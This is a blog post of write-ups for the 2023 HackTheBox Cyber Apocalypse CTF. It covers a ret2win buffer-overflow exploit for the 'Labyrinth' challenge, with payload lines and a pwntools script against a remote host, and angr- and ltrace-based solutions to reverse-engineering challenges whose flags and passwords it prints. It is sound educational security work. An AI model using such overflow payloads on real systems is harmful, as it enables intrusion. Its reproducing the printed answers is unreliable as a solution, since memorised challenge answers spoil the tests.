---
layout: post
title: 2023 HacktheBox Cyber Apocalypse CTF Write-ups
---

## 2023 HacktheBox Cyber Apocalypse CTF

This was an incredibly interesting event. Being my first big CTF competition, I went into it with the following goals:

* Complete all very easy challenges in forensics, crypto, and hardware
* Complete all very easy and easy challenges in reverse engineering and pwn.

I completed my goals with the exception of one challenge in pwn and one challenge in crypto.

### Pwn

The first three challenges were guided challenges, and with some very basic knowledge of buffer overflow, are very straightforward. The first challenge that I had to think about was Labyrinth.

#### Labyrinth

This challenge was hosted remotely, but the binary can be downloaded locally. First I exploited it locally, then I wrote a remote exploitation script.

When we run the binary, we see that we are asked to select a door between 1 and 100. First step is to use ```ltrace``` to see if we can extract a value it is looking for.
```
strncmp("50\n", "69", 2)                            
```

We can see that the value it is looking for is 69. We can run it again and see what we get. Next, we are given a narrative prompt and asked if we would like to change the door we chose earlier. Using ```ltrace``` again, let's see if our input is being compared with another value.
```
fgets(69
"69\n", 68, 0x7f136d25daa0)                                               = 0x7fffb3622440
fprintf(0x7f136d25e780, "\n%s[-] YOU FAILED TO ESCAPE!\n\n", "\
```

Nothing this time. Time to open up the binary in ```ghidra``` and see what we can find.

Using Ghidra, we can see that the program is contained to the ```main``` function, but upon inspection of the functions list, we see a function named ```escape_plan```. This looks like a ```ret2win``` challenge. To confirm, let's see if we can overwrite the return address. 

The ```fgets``` function is reading in ```68``` bytes.
```
        004015c2 48 8b 15        MOV        RDX,qword ptr [stdin]
                 57 2a 00 00
        004015c9 48 8d 45 d0     LEA        RAX=>user_input,[RBP + -0x30]
        004015cd be 44 00        MOV        ESI,0x44
                 00 00
        004015d2 48 89 c7        MOV        RDI,RAX
        004015d5 e8 d6 fa        CALL       <EXTERNAL>::fgets                           
```

And looking at the stack setup for the function, we see that the ```user_input``` buffer is only ```56``` bytes long. 
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[10]:    00401457(W), 
                                                                                                   00401464(R), 
                                                                                                   00401472(R), 
                                                                                                   0040148c(R), 
                                                                                                   0040149a(R), 
                                                                                                   004014bb(R), 
                                                                                                   004014d3(R), 
                                                                                                   00401503(R), 
                                                                                                   00401514(RW), 
                                                                                                   00401519(R)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[4]:     0040154e(W), 
                                                                                                   00401559(R), 
                                                                                                   0040156a(R), 
                                                                                                   00401586(R)  
             undefined8        Stack[-0x20]:8 local_20                                XREF[1]:     0040142f(W)  
             undefined8        Stack[-0x28]:8 local_28                                XREF[1]:     00401427(W)  
             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     0040141f(W)  
             undefined8        Stack[-0x38]:8 user_input                              XREF[2]:     00401417(W), 
                                                                                                   004015c9(*)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:0040115d(*), 
                                                                                          _start:0040115d(*), 004025bc, 
                                                                                          00402700(*)  
        00401405 55              PUSH       RBP
```

```ret2win``` confirmed!

Next step is dynamic analysis to confirm the offset. There is no better tool for this than ```pwndbg```. Loading the binary, we can generate a cyclical string in accordance with the bit architecture to help us identify the correct offset.
```
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

Now let's set a break point before the return function use the string as input. 
```
0x401602 <main+509>    ret    <0x6161616161616168>
```

We can use the ```cyclic``` command again to get the offset.
```
pwndbg> cyclic -l haaaaaaa
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 56
```

So we know that the offset is 56 bytes, but now we need the address of the ```escape_plan``` function. We can type ```info fun``` into the ```pwndbg``` console to get a list of function addresses.
```
0x0000000000401255  escape_plan
```

Perfect, now we have our payload. We can use a inline python command to generate a payload and enter it pass it to the binary in ```pwndbg```.
```
python2 -c 'print "69\n" + "A" * 56 + "\x55\x12\x40\x00\x00\x00\x00\x00"' > payload_test
```

Now pass it to the program in ```pwndbg```.
```
0x401602 <main+509>          ret                                  <0x401255; escape_plan>
```

Unfortunately, we get a segmentation fault when we call the ```fwrite``` in the ```escape_plan``` function. This is due to a stack alignment error. To correct this, we just need to add the return address of main just before the payload.
```
python2 -c 'print "69\n" + "A" * 56 + "\x02\x16\x40\x00\x00\x00\x00\x00" "\x55\x12\x40\x00\x00\x00\x00\x00"' > payload_test
```

And voila, it works! Now for the exploit.
```python
#!/usr/bin/env python2

from pwn import *

IP = '161.35.168.118'
PORT = 31858

r = remote(IP, PORT)

payload = "69\n" + "A" * 56 + "\x02\x16\x40\x00\x00\x00\x00\x00" + "\x55\x12\x40\x00\x00\x00\x00\x00"

r.sendline(payload)

r.interactive()
```

Pretty standard, but gets the job done!

### Reverse Engineering

#### Shattered Tablet

First, we can run ```strings``` and ```ltrace``` to see what we can find. Unfortunately, nothing pops out. Let's open it in ghidra.
```c
undefined8 main(void)

{
  undefined8 flag_section_1;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  flag_section_1 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  printf("Hmmmm... I think the tablet says: ");
  fgets((char *)&flag_section_1,0x40,stdin);
  if (((((((((local_30._7_1_ == 'p') && (flag_section_1._1_1_ == 'T')) &&
           (flag_section_1._7_1_ == 'k')) && ((local_28._4_1_ == 'd' && (local_40._3_1_ == '4'))))
         && ((local_38._4_1_ == 'e' && ((local_40._2_1_ == '_' && ((char)flag_section_1 == 'H'))))))
        && (local_28._2_1_ == 'r')) &&
       ((((local_28._3_1_ == '3' && (local_30._1_1_ == '_')) && (flag_section_1._2_1_ == 'B')) &&
        (((local_30._5_1_ == 'r' && (flag_section_1._3_1_ == '{')) &&
         ((local_30._2_1_ == 'b' && ((flag_section_1._5_1_ == 'r' && (local_40._5_1_ == '4')))))))))
       ) && (((local_30._6_1_ == '3' &&
              (((local_38._3_1_ == 'v' && (local_40._4_1_ == 'p')) && (local_28._1_1_ == '1')))) &&
             (((local_30._3_1_ == '3' && (local_38._1_1_ == 'n')) &&
              (((flag_section_1._4_1_ == 'b' && (((char)local_28 == '4' && (local_40._1_1_ == 'n')))
                ) && ((char)local_38 == ',')))))))) &&
     ((((((((char)local_40 == '3' && (flag_section_1._6_1_ == '0')) && (local_38._7_1_ == 't')) &&
         ((local_40._7_1_ == 't' && ((char)local_30 == '0')))) &&
        ((local_40._6_1_ == 'r' && ((local_28._5_1_ == '}' && (local_38._5_1_ == 'r')))))) &&
       (local_38._6_1_ == '_')) && ((local_38._2_1_ == '3' && (local_30._4_1_ == '_')))))) {
    puts("Yes! That\'s right!");
  }
  else {
    puts("No... not that");
  }
  return 0;
}
```

A lot of compares! We can either do this manually (boring) or try and use ```angr```.

##### Angr

Angr is a binary analysis platform in python and it is ABSURDLY powerful. So powerful, that if you master the api, you might not need to actually reverse engineer anything ever again! 

While the nitty gritty of how angr works is beyond the scope of this write up, it includes a lot of compiler theory, symbolic execution, and SAT solving. Basically, is steps through a binary and generates "states" for each branch that is produced.  More info can be found [here](https://docs.angr.io/)

Using this, we can let angr do the hardwork for us.
```python
#!/usr/bin/env python3

import angr

# Create project
p = angr.Project("./tablet")

# Create Simulation Manager to manage states
simgr = p.factory.simgr()

# Find the state which leads to the successful output
simgr.explore(find=lambda s: b"Yes! That\'s right!" in s.posix.dumps(1))

# Ensure a succesful state was found
if len(simgr.found) > 0:
        s = simgr.found[0]
        print(s.posix.dumps(0))
else:
    print("No solution found!")
```

Running this yields the flag. Et Voila!
```
b'HTB{br0k3n_4p4rt,n3ver_t0_b3_r3p41r3d}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

#### Needle in a Haystack

This challenge was quite easy. Simply run ```strings``` on the binary and grep for "HTB{"
```
└─$ strings haystack | grep "HTB{"
HTB{d1v1ng_1nt0_th3_d4tab4nk5}
```

#### She Shells C Shells

This challenge took a little bit more work. The ```strings``` command yielded nothing, but if we use ``ltrace```, we can see a list of command that can be use in the "shell".
```
└─$ ltrace ./shell
printf("ctfsh-$ ")                                  = 8
fgets(ctfsh-$ 123
"123\n", 1024, 0x7f543e97aa80)                = 0x7ffd9e5cb520
strchr("123\n", '\n')                               = "\n"
strdup("123")                                       = 0x55b68e2edac0
strtok("123", " ")                                  = "123"
strtok(nil, " ")                                    = nil
strcmp("ls", "123")                                 = 59
strcmp("whoami", "123")                             = 70
strcmp("cat", "123")                                = 50
strcmp("getflag", "123")                            = 54
strcmp("help", "123")                               = 55
fprintf(0x7f543e97b680, "No such command `%s`\n", "123"No such command `123`
) = 22
free(0x55b68e2edac0)                                = <void>
printf("ctfsh-$ ")                                  = 8
fgets(ctfsh-$ 
```

I think it is safe to assume that the ```getflag``` command is where we need to be. If we enter the ```getflag``` command, we are prompted for a password. Sadly, we don't see a ```strcmp``` function, but a ```memcmp``` instead. We will need to work a little bit harder for this one. Let's fire up ghidra.

We can see that there are a few function, but the ```func_flag``` function stands out as the one we are looking for. Once we open it, we see that there is some ```xor``` magic at work.
```c
  fgets((char *)&password_start,256,stdin);
  for (counter = 0; counter < 77; counter = counter + 1) {
    *(byte *)((long)&password_start + (long)(int)counter) =
         *(byte *)((long)&password_start + (long)(int)counter) ^ m1[(int)counter];
  }
  memcmp_return_val = memcmp(&password_start,t,77);
  if (memcmp_return_val == 0) {
    for (counter2 = 0; counter2 < 0x4d; counter2 = counter2 + 1) {
      *(byte *)((long)&password_start + (long)(int)counter2) =
           *(byte *)((long)&password_start + (long)(int)counter2) ^ m2[(int)counter2];
    }
    printf("Flag: %s\n",&password_start);
    uVar1 = 0;
  }
  else {
    uVar1 = 0xffffffff;
  }
  return uVar1;
}
```

Essentially, ```t``` is ```xor```ed with ```m2``` and this yields the flag.
```
HTB{cr4ck1ng_0p3n_sh3ll5_by_th3_s34_sh0r3}
```

#### Hunting Lisence

This is a unique challenge in that it asks a series of questions before presenting the flag. The first thing is check the file type and run ```strings``` and ```ltrace``` to see what we can find.

```ltrace``` turns up quite a bit for us. We get all three passwords.
```
strcmp("asdf", "PasswordNumeroUno")
```
```
strcmp("dfgh", "P4ssw0rdTw0")
```
```
strcmp("asdf", "ThirdAndFinal!!!")
```

Once connected to the server, these passwords can be used to answer all the questions and get the flag.

#### Cave System

Running ```strings``` and ```ltrace``` leaves us with nothing. Time to open it in ghidra.

Once open, we see that there is a LOT of mangling going on with our input, which is then printed to return give us the flag. Only a psychopath would want to try and do this manually. Time for angr!
```python
#!/usr/bin/env python3

import angr

p = angr.Project("./cave") # Create project

simgr = p.factory.simgr() # Create Simululation Manager to manage states

simgr.explore(find=lambda s: b"Freedom at last!" in s.posix.dumps(1)) # Find the state which leads to successful output

if len(simgr.found) > 0: # Ensure a successful state was found
    s = simgr.found[0]
    print(s.posix.dumps(0)) # Print flag
else:
    print("No solution found!")
```

Running this reveals the flag!

